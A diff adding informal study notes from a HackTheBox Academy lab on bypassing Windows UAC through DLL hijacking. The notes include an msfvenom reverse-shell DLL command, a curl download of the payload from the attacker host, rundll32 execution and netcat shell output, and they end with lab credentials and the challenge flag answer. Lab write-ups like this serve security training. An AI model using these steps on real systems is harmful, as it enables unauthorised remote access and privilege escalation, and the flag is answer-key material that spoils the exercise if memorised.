@@ -63,3 +63,152 @@ CMD SYNTAX: C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Curr
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
     ConsentPromptBehaviorAdmin    REG_DWORD    0x5
 
+
+When attempting to locate a DLL, Windows will use the following search order.
+
+1. The directory from which the application loaded.
+2. The system directory C:\Windows\System32 for 64-bit systems.
+3. The 16-bit system directory C:\Windows\System (not supported on 64-bit systems)
+4. The Windows directory.
+5. Any directories that are listed in the PATH environment variable.
+
+Reviewing Path Variable
+
+PS SYNTAX: PS C:\htb> cmd /c echo %PATH%
+
+C:\Windows\system32;
+C:\Windows;
+C:\Windows\System32\Wbem;
+C:\Windows\System32\WindowsPowerShell\v1.0\;
+C:\Users\sarah\AppData\Local\Microsoft\WindowsApps;
+
+We can potentially bypass UAC in this by using DLL hijacking by placing a malicious srrstr.dll DLL to WindowsApps folder, which will be loaded in an elevated context.
+
+Generating Malicious srrstr.dll DLL
+First, let's generate a DLL to execute a reverse shell.
+
+KALI SYNTAX: MJBUCKNER@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of dll file: 5120 bytes
+
+* Note: In the example above, we specified our tun0 VPN IP address.
+
+** HOST PYTHON SERVER ON KALI TO TRANSFER 
+
+TO DOWNLOAD -> 
+
+PS SYNTAX: PS C:\htb>curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
+
+THEN START NC LISTENER ON KALI 
+
+Testing Connection
+If we execute the malicious srrstr.dll file, we will receive a shell back showing normal user rights (UAC enabled). To test this, we can run the DLL using rundll32.exe to get a reverse shell connection.
+
+CMD SYNTAX: C:\htb> rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
+
+!@!@! THIS CONNECTION SHOULD JUST BE NORMAL USER PRIVS !@#$@#%*!@ 
+
+KALI SYNTAX: MJBUCKNER@htb[/htb]$ nc -lnvp 8443
+
+listening on [any] 8443 ...
+
+connect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 49789
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+
+C:\Users\sarah> whoami /priv
+
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                          State   
+============================= ==================================== ========
+SeShutdownPrivilege           Shut down the system                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
+SeUndockPrivilege             Remove computer from docking station Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
+SeTimeZonePrivilege           Change the time zone                 Disabled
+
+
+Executing SystemPropertiesAdvanced.exe on Target Host
+Before proceeding, we should ensure that any instances of the rundll32 process from our previous execution have been terminated.
+
+cmd sytnax: C:\htb> tasklist /svc | findstr "rundll32"
+rundll32.exe                  6300 N/A
+rundll32.exe                  5360 N/A
+rundll32.exe                  7044 N/A
+
+C:\htb> taskkill /PID 7044 /F
+SUCCESS: The process with PID 7044 has been terminated.
+
+C:\htb> taskkill /PID 6300 /F
+SUCCESS: The process with PID 6300 has been terminated.
+
+C:\htb> taskkill /PID 5360 /F
+SUCCESS: The process with PID 5360 has been terminated.
+
+Now, we can try the 32-bit version of SystemPropertiesAdvanced.exe from the target host.
+
+cmd syntax: C:\htb> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
+
+so i assume then we cancel the listener and re-launch it since its using the same 8443 as port??? 
+
+KALI SYNTAX: MJBUCKNER@htb[/htb]$ nc -lvnp 8443
+
+listening on [any] 8443 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 50273
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+
+whoami
+winlpe-ws03\sarah
+
+
+C:\Windows\system32>whoami /priv
+
+whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                            Description                                                        State
+========================================= ================================================================== ========
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
+SeSystemProfilePrivilege                  Profile system performance                                         Disabled
+SeSystemtimePrivilege                     Change the system time                                             Disabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
+SeBackupPrivilege                         Back up files and directories                                      Disabled
+SeRestorePrivilege                        Restore files and directories                                      Disabled
+SeShutdownPrivilege                       Shut down the system                                               Disabled
+SeDebugPrivilege                          Debug programs                                                     Disabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
+SeUndockPrivilege                         Remove computer from docking station                               Disabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
+SeTimeZonePrivilege                       Change the time zone                                               Disabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
+
+
+CHALLENGE: RDP to 10.129.65.142 (ACADEMY-WINLPE-WS03) with user "sarah" and password "HTB_@cademy_stdnt!"
+
+Question 1 -  Follow the steps in this section to obtain a reverse shell connection with normal user privileges and another which bypasses UAC. Submit the contents of flag.txt on the sarah user's Desktop when finished. - I_bypass3d_Uac!
+1) xfreerdp /v:10.129.65.142 /u:sarah /p:HTB_@cademy_stdnt! /drive:shared,/home/htb-ac-1235531/Desktop
+2) honestly if we just follow step by step AND we do discconnect the normal user privs shell once we taskkill the 3 rundll32.exe PIDS
+3) once we connect back with nt-authority shell were good. - I_bypass3d_Uac!
